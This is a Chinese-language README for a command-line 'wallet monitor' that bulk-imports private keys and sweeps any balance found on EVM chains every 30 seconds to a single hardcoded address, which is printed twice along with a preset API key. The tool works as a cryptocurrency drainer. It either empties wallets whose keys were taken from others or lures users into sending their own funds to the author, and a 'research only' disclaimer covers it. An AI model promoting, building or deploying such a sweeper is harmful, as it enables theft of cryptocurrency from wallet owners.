# 🔐 钱包监控转账系统

一个支持所有Alchemy EVM兼容链的智能钱包监控和自动转账系统。

## ✨ 主要功能

- 🌐 **多链支持**: 支持所有Alchemy支持的EVM兼容链
- 🔑 **智能私钥导入**: 批量导入，智能识别私钥格式
- 🎯 **自动监控**: 实时监控钱包余额变化
- 💸 **自动转账**: 发现余额立即转移到指定地址
- 📊 **交互式界面**: 简洁友好的命令行界面
- 🔄 **断点续传**: 服务器重启后自动恢复监控状态
- 📝 **智能日志**: 完整的操作和转账记录

## 🌐 支持的区块链网络

### 主网
- Ethereum 主网
- Polygon 主网  
- Arbitrum 主网
- Optimism 主网
- Base 主网
- BNB Chain 主网
- Avalanche 主网

### 测试网
- Ethereum Sepolia/Holesky
- Polygon Mumbai/Amoy
- Arbitrum Sepolia
- Optimism Sepolia
- Base Sepolia
- BNB Chain 测试网
- Avalanche Fuji

## 🚀 快速开始

### 方法一：一键安装脚本 (推荐)

```bash
# 1. 下载所有文件到同一目录
# 2. 运行一键安装脚本
./install.sh
```

### 方法二：Python启动器

```bash
# 运行Python启动器
python3 wallet_monitor_launcher.py
```

### 方法三：手动安装

```bash
# 1. 安装依赖
pip install web3 eth-account alchemy-sdk colorama aiohttp cryptography

# 2. 运行主程序
python3 wallet_monitor.py
```

## 📋 文件说明

- `wallet_monitor.py` - 主程序，包含所有核心功能
- `wallet_monitor_launcher.py` - Python启动器，自动检测和安装依赖
- `install.sh` - 一键安装脚本，适用于Linux/macOS
- `README.md` - 说明文档

## 🎮 使用指南

### 1. 启动程序

运行任一启动方式后，会看到交互式菜单：

```
============================================================
🔐 钱包监控转账系统 v1.0
============================================================

📋 功能菜单:
1. 📥 导入私钥
2. 🎯 开始监控  
3. 📊 查看状态
4. 🚪 退出
```

### 2. 导入私钥

选择功能1进入私钥导入界面：

- 支持批量粘贴私钥
- 智能识别私钥格式，忽略其他内容
- 自动去重，避免重复导入
- 双击回车确认导入

**示例输入格式：**
```
这是我的私钥：
0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
还有一个私钥：
fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210
其他无关内容会被忽略
```

### 3. 开始监控

选择功能2开始监控：

- 自动扫描每个钱包在各链上的交易记录
- 只启用有交易记录的链进行监控
- 每30秒检查一次余额
- 发现余额立即转移到目标地址

### 4. 监控过程

监控运行时会显示：
- 实时余额检查状态
- 发现余额时的转账操作
- 详细的交易哈希和确认信息
- 完整的操作日志

## ⚙️ 配置说明

### API密钥配置
程序中已预设API密钥：`S0hs4qoXIR1SMD8P7I6Wt`

### 目标转账地址
所有监控到的余额将自动转移到：`0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1`

### 生成的文件
- `private_keys.json` - 加密存储的私钥文件
- `monitoring_log.json` - 转账操作记录
- `monitor_config.json` - 监控配置和状态
- `wallet_monitor.log` - 详细运行日志

## 🔒 安全特性

- 私钥本地存储，不上传任何服务器
- 智能私钥验证，防止无效私钥导入
- 完整的操作日志，便于审计
- 异常处理机制，确保程序稳定运行

## 🛠️ 技术特性

- 异步并发监控，提高效率
- 智能网络选择，避免无效监控
- 断点续传，服务器重启不丢失状态
- 彩色终端输出，提升用户体验
- 跨平台支持 (Windows/macOS/Linux)

## 📞 故障排除

### 常见问题

1. **Python版本过低**
   - 需要Python 3.8+
   - 建议使用最新的Python版本

2. **依赖安装失败**
   - 尝试升级pip: `pip install --upgrade pip`
   - 使用国内镜像: `pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/`

3. **网络连接问题**
   - 检查网络连接
   - 确认API密钥有效
   - 检查防火墙设置

4. **权限问题**
   - Linux/macOS: 确保脚本有执行权限
   - Windows: 以管理员身份运行

### 重新安装

如果遇到问题，可以重新运行安装脚本：

```bash
./install.sh
```

或使用Python启动器：

```bash
python3 wallet_monitor_launcher.py
```

## 📄 许可证

本项目仅供学习和研究使用。使用时请遵守相关法律法规。

## ⚠️ 免责声明

- 本软件仅供技术研究使用
- 用户需自行承担使用风险
- 请确保遵守当地法律法规
- 建议在测试网络上先行测试

---

**🎯 目标转账地址**: `0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1`

**🔑 API密钥**: `S0hs4qoXIR1SMD8P7I6Wt`
